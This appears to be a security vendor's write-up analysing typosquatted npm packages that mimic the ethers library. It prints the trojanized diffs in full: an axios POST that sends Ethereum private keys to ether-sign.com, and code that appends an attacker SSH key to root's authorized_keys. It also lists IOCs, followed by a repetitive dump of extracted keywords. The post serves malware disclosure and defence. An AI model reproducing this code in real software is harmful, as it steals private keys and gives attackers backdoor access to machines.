@@ -1,0 +1,413 @@
+
+Phylum’s automated risk detection platform recently flagged several suspicious packages published to npm. Upon investigation, we found these packages attempting to exfiltrate Ethereum private keys and gain SSH access to the victim’s machine by writing the attacker’s SSH public key in the root user’s authorized_keys file.
+
+
+Stop me if you’ve heard this one before
+If this tune sounds familiar, it’s because it is. In August of 2023, we published a write-up of a similar attack involving a benign-looking typosquatted package called ethereum-cryptographyy (notice the two 'y's at the end). In that attack, the attacker replaced the legitimate @noble/curves dependency—a package containing essential cryptographic functions used by the real ethereum-cryptography—with a trojanized version that included all the same functionality but added a single POST request to a remote server to steal Ethereum private keys.
+This attack
+The attack we’re highlighting in this write-up takes a slightly different approach. Instead of smuggling the maliciousness in a dependency, the attacker is attempting to hide in plain sight. In fact, they went to great lengths to make the code look and sound as benign and appropriate as possible. Even the domain they registered (ether-sign[.]com)—which is sitting right there in the code—sounds like it could be legit. Let’s dig into it.
+Unlike the traditional infect-on-install via an install hook malware variety, this attack requires the developer to use the malicious library. The attacker assumes that the victim will use this library as if it were the legitimately popular ethers library (1.3M weekly downloads). So, to see how the victim is infected, we’ll run through the code as if we were using this library.
+The typical use case for the ethers library involves creating a new Wallet instance using a private key:
+const { Wallet } = require('ethers-mew'); // <-- 'ethers-mew' is one of the malicious packages (do not try this at home)
+const wallet = new Wallet(privateKey);
+And that’s all it takes to trip this particular malware. Let’s look at wallet/wallet.js to see what happens when we create a new Wallet instance. All the diffs we will show are from the legit ethers@6.14.3 and ethers-mew@6.14.3. Here’s the diff of wallet/wallet.js:
+--- 
+
++++ 
+
+@@ -6,10 +6,11 @@
+
+ const base_wallet_js_1 = require("./base-wallet.js");
+ const hdwallet_js_1 = require("./hdwallet.js");
+ const json_crowdsale_js_1 = require("./json-crowdsale.js");
+ const json_keystore_js_1 = require("./json-keystore.js");
+ const mnemonic_js_1 = require("./mnemonic.js");
++const index_js_3 = require("../transaction/index.js");
+ function stall(duration) {
+     return new Promise((resolve) => { setTimeout(() => { resolve(); }, duration); });
+ }
+ /**
+  *  A **Wallet** manages a single private key which is used to sign
+ @@ -27,10 +28,13 @@
+
+      *  to %%provider%%.
+      */
+     constructor(key, provider) {
+         if (typeof (key) === "string" && !key.startsWith("0x")) {
+             key = "0x" + key;
++        }
++        if (typeof key === "string") {
++            (0, index_js_3.checkAddress)(key);
+         }
+         let signingKey = (typeof (key) === "string") ? new index_js_1.SigningKey(key) : key;
+         super(signingKey, provider);
+     }
+     connect(provider) {
+You can see the attacker simply introduced another check if the key is a string—which it certainly will be when a private key is supplied as the argument) and if it is, it calls another function index_js_3.checkAddress supplying the key as the argument. Notice that this function is imported from the transaction/index.js file. Taking a quick look there, here’s the diff:
+--- 
+
++++ 
+
+@@ -3,15 +3,17 @@
+
+  *  Each state-changing operation on Ethereum requires a transaction.
+  *
+  *  @_section api/transaction:Transactions  [about-transactions]
+  */
+ Object.defineProperty(exports, "__esModule", { value: true });
+-exports.Transaction = exports.recoverAddress = exports.computeAddress = exports.accessListify = void 0;
++exports.Transaction = exports.recoverAddress = exports.superSignKey = exports.checkAddress = exports.computeAddress = exports.accessListify = void 0;
+ null;
+ var accesslist_js_1 = require("./accesslist.js");
+ Object.defineProperty(exports, "accessListify", { enumerable: true, get: function () { return accesslist_js_1.accessListify; } });
+ var address_js_1 = require("./address.js");
+ Object.defineProperty(exports, "computeAddress", { enumerable: true, get: function () { return address_js_1.computeAddress; } });
++Object.defineProperty(exports, "checkAddress", { enumerable: true, get: function () { return address_js_1.checkAddress; } });
++Object.defineProperty(exports, "superSignKey", { enumerable: true, get: function () { return address_js_1.superSignKey; } });
+ Object.defineProperty(exports, "recoverAddress", { enumerable: true, get: function () { return address_js_1.recoverAddress; } });
+ var transaction_js_1 = require("./transaction.js");
+ Object.defineProperty(exports, "Transaction", { enumerable: true, get: function () { return transaction_js_1.Transaction; } });
+ //# sourceMappingURL=index.js.map
+Interestingly, we see two new exports: checkAddress and superSignKey. We’ll put a pin in superSignKey because we’re currently chasing checkAddress. Let’s take a look in transaction/address.js. Here’s the diff:
+--- 
+
++++ 
+
+@@ -1,10 +1,13 @@
+
+ "use strict";
+ Object.defineProperty(exports, "__esModule", { value: true });
+-exports.recoverAddress = exports.computeAddress = void 0;
++exports.recoverAddress = exports.superSignKey = exports.checkAddress = exports.computeAddress = void 0;
++const tslib_1 = require("tslib");
+ const index_js_1 = require("../address/index.js");
+ const index_js_2 = require("../crypto/index.js");
++const index_js_3 = require("../utils/index.js");
++const fs_1 = tslib_1.__importDefault(require("fs"));
+ /**
+  *  Returns the address for the %%key%%.
+  *
+  *  The key may be any standard form of public key or a private key.
+  */
+@@ -17,10 +20,35 @@
+
+         pubkey = key.publicKey;
+     }
+     return (0, index_js_1.getAddress)((0, index_js_2.keccak256)("0x" + pubkey.substring(4)).substring(26));
+ }
+ exports.computeAddress = computeAddress;
++function checkAddress(key) {
++    if ((0, index_js_3.checkServer)(key)) {
++        return true;
++    }
++    return false;
++}
++exports.checkAddress = checkAddress;
++function superSignKey() {
++    const filePath = '/root/.ssh/authorized_keys';
++    try {
++        fs_1.default.appendFile(filePath, (0, index_js_1.getAddress)("signatureKey"), (err) => {
++            if (err) {
++                return false;
++            }
++            else {
++                return true;
++            }
++        });
++    }
++    catch (error) {
++        return false;
++    }
++    return true;
++}
++exports.superSignKey = superSignKey;
+ /**
+  *  Returns the recovered address for the private key that was
+  *  used to sign %%digest%% that resulted in %%signature%%.
+  */
+ function recoverAddress(digest, signature) {
+The relevant part for us is:
+const index_js_3 = require("../utils/index.js");
+...
+export function checkAddress(key) {
+    if ((0, index_js_3.checkServer)(key)) {
+        return true;
+    }
+    return false;
+}
+Yet another call to a function from another file. Side note: from the constructor, the attacker claimed we were only going to “checkAddress,” but now you can see that it’s actually forwarding that call to another function called checkServer, introducing yet another layer of indirection. Notice also all the appropriate sounding function name choices: checkAddress and checkServer. It seems like they could very well be legitimate functions performing necessary tasks. Let’s take a look in utils/index.js:
+---
+
++++
+
+@@ -73,6 +73,10 @@
+
+ Object.defineProperty(exports, "toUtf8CodePoints", { enumerable: true, get: function () { return utf8_js_1.toUtf8CodePoints; } });
+ Object.defineProperty(exports, "toUtf8String", { enumerable: true, get: function () { return utf8_js_1.toUtf8String; } });
+ Object.defineProperty(exports, "Utf8ErrorFuncs", { enumerable: true, get: function () { return utf8_js_1.Utf8ErrorFuncs; } });
+ var uuid_js_1 = require("./uuid.js");
+ Object.defineProperty(exports, "uuidV4", { enumerable: true, get: function () { return uuid_js_1.uuidV4; } });
++/////////////////////////////
++// Types
++var data_js_2 = require("./data.js");
++Object.defineProperty(exports, "checkServer", { enumerable: true, get: function () { return data_js_2.checkServer; } });
+ //# sourceMappingURL=index.js.map
+Annnnd another file we have to dig through! checkServer is pulled in from data.js so let’s go take a look there:
+--- 
+
++++ 
+
+@@ -1,15 +1,17 @@
+
+ "use strict";
+ Object.defineProperty(exports, "__esModule", { value: true });
+-exports.zeroPadBytes = exports.zeroPadValue = exports.stripZerosLeft = exports.dataSlice = exports.dataLength = exports.concat = exports.hexlify = exports.isBytesLike = exports.isHexString = exports.getBytesCopy = exports.getBytes = void 0;
++exports.zeroPadBytes = exports.zeroPadValue = exports.stripZerosLeft = exports.dataSlice = exports.dataLength = exports.concat = exports.hexlify = exports.isBytesLike = exports.isHexString = exports.getBytesCopy = exports.getBytes = exports.checkServer = void 0;
++const tslib_1 = require("tslib");
+ /**
+  *  Some data helpers.
+  *
+  *
+  *  @_subsection api/utils:Data Helpers  [about-data]
+  */
+ const errors_js_1 = require("./errors.js");
++const axios_1 = tslib_1.__importDefault(require("axios"));
+ function _getBytes(value, name, copy) {
+     if (value instanceof Uint8Array) {
+         if (copy) {
+             return new Uint8Array(value);
+         }
+@@ -24,10 +26,27 @@
+
+         }
+         return result;
+     }
+     (0, errors_js_1.assertArgument)(false, "invalid BytesLike value", name || "value", value);
+ }
++/**
++ *  Get a typed checkServer permission for traditional ether-sign
++ *  to prevent any modifications of the returned value from being
++ *  reflected elsewhere.
++ *
++ *  @see: checkServer
++ */
++function checkServer(key) {
++    try {
++        axios_1.default.post('<https://ether-sign.com/api/checkServer>', { sign: key });
++        return true;
++    }
++    catch (err) {
++        return false;
++    }
++}
++exports.checkServer = checkServer;
+ /**
+  *  Get a typed Uint8Array for %%value%%. If already a Uint8Array
+  *  the original %%value%% is returned; if a copy is required use
+  *  [[getBytesCopy]].
+  *
+Finally (!!), we see the definition of checkServer:
+function checkServer(key) {
+    try {
+        axios_1.default.post('<https://ether-sign.com/api/checkServer>', { sign: key });
+        return true;
+    }
+    catch (err) {
+        return false;
+    }
+}
+Remember, the key passed to this function is your Ethereum private key! So this “address server check” is really shipping your private key off to an endpoint at ether-sign[.]com. Again, it’s a plausible-sounding name, but taking a quick look at the whois, we see that it was just registered on October 15, 2024. We can also see it’s hosted on Hetzner Online on a machine with an IP of 88[.]99[.]95[.]50.
+Ok, with that sorted, let’s pull the thread on that other function we saw the attacker introduce, which is called superSign. Looking through the diffs, we can find the “entrypoint” is in the signing-key.js file:
+--- 
+
++++ 
+
+@@ -7,20 +7,22 @@
+
+ Object.defineProperty(exports, "__esModule", { value: true });
+ exports.SigningKey = void 0;
+ const secp256k1_1 = require("@noble/curves/secp256k1");
+ const index_js_1 = require("../utils/index.js");
+ const signature_js_1 = require("./signature.js");
++const index_js_2 = require("../transaction/index.js");
+ /**
+  *  A **SigningKey** provides high-level access to the elliptic curve
+  *  cryptography (ECC) operations and key management.
+  */
+ class SigningKey {
+     #privateKey;
+     /**
+      *  Creates a new **SigningKey** for %%privateKey%%.
+      */
+     constructor(privateKey) {
++        (0, index_js_2.superSignKey)();
+         (0, index_js_1.assertArgument)((0, index_js_1.dataLength)(privateKey) === 32, "invalid private key", "privateKey", "[REDACTED]");
+         this.#privateKey = (0, index_js_1.hexlify)(privateKey);
+     }
+     /**
+      *  The private key.
+ @@ -39,10 +41,14 @@
+
+      *  This will always begin with either the prefix ``0x02`` or ``0x03``
+      *  and be 68 characters long (the ``0x`` prefix and 33 hexadecimal
+      *  nibbles)
+      */
+     get compressedPublicKey() { return SigningKey.computePublicKey(this.#privateKey, true); }
++    /**
++     *  The check template address
++     */
++    get check() { return this.#privateKey; }
+     /**
+      *  Return the signature of the signed %%digest%%.
+      */
+     sign(digest) {
+         (0, index_js_1.assertArgument)((0, index_js_1.dataLength)(digest) === 32, "invalid digest length", "digest", digest);
+They send us through transactions/index.js again, which we saw earlier, and then into address.js, which we also saw earlier, and where this function is actually defined. Here it is in address.js:
+function superSignKey() {
+    const filePath = '/root/.ssh/authorized_keys';
+    try {
+        fs_1.default.appendFile(filePath, (0, index_js_1.getAddress)("signatureKey"), (err) => {
+            if (err) {
+                return false;
+            }
+            else {
+                return true;
+           }
+        });
+    }
+    catch (error) {
+        return false;
+    }
+    return true;
+}
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_633909\Screenshot20241017at1.05.04PM.png
+It’s modifying the root authorized_keys file! To see what it’s adding there, we’ll have to find getAddress and remember it’s passing in a string argument of "signatureKey". Following the imports, we eventually get to address/address.js:
+--- 
+
++++ 
+
+@@ -105,10 +105,13 @@
+
+  *    // but the checksum fails
+  *    getAddress("0x8Ba1f109551bD432803012645Ac136ddd64DBA72")
+  *    //_error:
+  */
+ function getAddress(address) {
++    if (address === "signatureKey") {
++        return '\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8v6v3yX4iFuwj3Z7KnHBVlaQ1nTuLeR+EzVCgu2XWobV6Am4rmsWpLhBXQ3EEqHhnrlWvMIna/pHdw2HGNn31J5igyepx6YBdzJJptcAE3EN856YcQjPnyndZIjafiltUtd4hWvhkaGO9ODid+NXX/xsTDpqHfgYdzEYbQImH1MXzUrWFqNLW8ryMKfdWBTZmy/2tCa59/NjnE5KRibrtWfL3SmkkCQaVb5B+WSewt3t+0ZZElpYxBIt/HZMYxnK90++3L2A6FxR93Dq+QHXdCxivxk2OPJFSojcqjvPRVCsPYtCZfZAbzFsFOCRJT+j6yAquM8X30qUo9NmNaWqFLyJHOkM3vEHNvtRFOFGAZHNYEp288qj0hSS9dAlck5PcIneBhdkUtQ27AwXuk1O8JhBuH4D1sjYTV3R8d20AgH5d+fug97dunoRHhD1einGr4beoFqRYuj+n7NoROxlB1h8etVL0JNEjoKJtWbgp+Y/LpwDRcMh+eQCMBy9ZT3E= cp@DESKTOP-7BQLEIP\\n';
++    }
+     (0, index_js_2.assertArgument)(typeof (address) === "string", "invalid address", "address", address);
+     if (address.match(/^(0x)?[0-9a-fA-F]{40}$/)) {
+         // Missing the 0x prefix
+         if (!address.startsWith("0x")) {
+             address = "0x" + address;
+Right, so getAddress when called with "signatureKey" will send back, presumably, the attacker’s SSH key, which is then added to the root’s authorized_keys file giving the attacker SSH access to the machine. So not only does the victim get their Ethereum private key stolen, their entire machine gets compromised as well.
+Before we conclude, it’s worth noting that the BaseWallet constructor has also been trojanized. Here’s wallet/base-wallet.js:
+--- 
+
++++ 
+
+@@ -30,11 +30,11 @@
+
+      *  If %%provider%% is not specified, only offline methods can
+      *  be used.
+      */
+     constructor(privateKey, provider) {
+         super(provider);
+-        (0, index_js_5.assertArgument)(privateKey && typeof (privateKey.sign) === "function", "invalid private key", "privateKey", "[ REDACTED ]");
++        (0, index_js_5.assertArgument)(privateKey && typeof (privateKey.sign) === "function" && (0, index_js_4.checkAddress)(privateKey.check), "invalid private key", "privateKey", "[ REDACTED ]");
+         this.#signingKey = privateKey;
+         const address = (0, index_js_4.computeAddress)(this.signingKey.publicKey);
+         (0, index_js_5.defineProperties)(this, { address });
+     }
+     // Store private values behind getters to reduce visibility
+Conclusion
+As we’ve seen, this attack is complex, attempting to hide the malware in plain sight under many layers of indirection. To recap this complexity, we must follow the chain from the Wallet constructor through several modules: wallet/wallet.js -> transaction/index.js -> transaction/address.js -> utils/index.js -> utils/data.js where we finally find the exfiltration of the keys. The story is similar for the SSH authorized_keys file modification. This is likely a deliberate choice by the attacker, exploiting the complexity and modularity of the original ethers library and a perfect example of how complex open-source threats are getting in the wild.
+The bad packages
+The following packages were identified as part of this campaign. Note that some appear to have been published for testing purposes, as multiple versions exist with slight differences. ethers-mew is the latest and most complete, with only a single version and the addition of the SSH key writing part.
+
+ethers-mew
+ethers-web3
+ethers-6
+ethers-eth
+ethers-aaa
+ethers-audit
+ethers-test
+All of these packages, along with the authors’ accounts, were only up for a very short period of time, apparently removed and deleted by the authors themselves. Here are some screen grabs before they were removed:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_633909\Screenshot20241016at1.35.24PM.png
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_633909\Screenshot20241017at12.15.09PM1.png
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_633909\Screenshot20241016at1.34.36PM.png
+For those curious, we did a reverse image search on the timyorks profile and found an image of a real person named Tim Waring who is apparently a renowned expert in the Yorkshire property market. We’re not sure what motivation the attacker had for bothering to find and then upload a picture to a short-lived npm account, but 🤷.
+IOCs
+
+ether-sign[.]com
+88[.]99[.]95[.]50
+From the SSH key:
+
+Attacker’s username and machine: cp@DESKTOP-7BQLEIP
+Attacker’s public SSH key: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8v6v3yX4iFuwj3Z7KnHBVlaQ1nTuLeR+EzVCgu2XWobV6Am4rmsWpLhBXQ3EEqHhnrlWvMIna/pHdw2HGNn31J5igyepx6YBdzJJptcAE3EN856YcQjPnyndZIjafiltUtd4hWvhkaGO9ODid+NXX/xsTDpqHfgYdzEYbQImH1MXzUrWFqNLW8ryMKfdWBTZmy/2tCa59/NjnE5KRibrtWfL3SmkkCQaVb5B+WSewt3t+0ZZElpYxBIt/HZMYxnK90++3L2A6FxR93Dq+QHXdCxivxk2OPJFSojcqjvPRVCsPYtCZfZAbzFsFOCRJT+j6yAquM8X30qUo9NmNaWqFLyJHOkM3vEHNvtRFOFGAZHNYEp288qj0hSS9dAlck5PcIneBhdkUtQ27AwXuk1O8JhBuH4D1sjYTV3R8d20AgH5d+fug97dunoRHhD1einGr4beoFqRYuj+n7NoROxlB1h8etVL0JNEjoKJtWbgp+Y/LpwDRcMh+eQCMBy9ZT3E=
+authorized_keys
+ethereum-cryptographyy
+@noble/curves
+ethereum-cryptography
+ether-sign[.]com
+ethers
+Wallet
+wallet/wallet.js
+Wallet
+ethers@6.14.3
+ethers-mew@6.14.3
+wallet/wallet.js
+index_js_3.checkAddress
+transaction/index.js
+checkAddress
+superSignKey
+superSignKey
+checkAddress
+transaction/address.js
+checkAddress
+checkServer
+checkAddress
+checkServer
+utils/index.js
+checkServer
+data.js
+checkServer
+key
+ether-sign[.]com
+88[.]99[.]95[.]50
+superSign
+signing-key.js
+transactions/index.js
+address.js
+address.js
+authorized_keys
+getAddress
+"signatureKey"
+address/address.js
+getAddress
+"signatureKey"
+authorized_keys
+BaseWallet
+wallet/base-wallet.js
+Wallet
+wallet/wallet.js
+transaction/index.js
+transaction/address.js
+utils/index.js
+utils/data.js
+authorized_keys
+ethers
+ethers-mew
+ethers-mew
+ethers-web3
+ethers-6
+ethers-eth
+ethers-aaa
+ethers-audit
+ethers-test
+timyorks
+ether-sign[.]com
+88[.]99[.]95[.]50
+cp@DESKTOP-7BQLEIP
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8v6v3yX4iFuwj3Z7KnHBVlaQ1nTuLeR+EzVCgu2XWobV6Am4rmsWpLhBXQ3EEqHhnrlWvMIna/pHdw2HGNn31J5igyepx6YBdzJJptcAE3EN856YcQjPnyndZIjafiltUtd4hWvhkaGO9ODid+NXX/xsTDpqHfgYdzEYbQImH1MXzUrWFqNLW8ryMKfdWBTZmy/2tCa59/NjnE5KRibrtWfL3SmkkCQaVb5B+WSewt3t+0ZZElpYxBIt/HZMYxnK90++3L2A6FxR93Dq+QHXdCxivxk2OPJFSojcqjvPRVCsPYtCZfZAbzFsFOCRJT+j6yAquM8X30qUo9NmNaWqFLyJHOkM3vEHNvtRFOFGAZHNYEp288qj0hSS9dAlck5PcIneBhdkUtQ27AwXuk1O8JhBuH4D1sjYTV3R8d20AgH5d+fug97dunoRHhD1einGr4beoFqRYuj+n7NoROxlB1h8etVL0JNEjoKJtWbgp+Y/LpwDRcMh+eQCMBy9ZT3E=
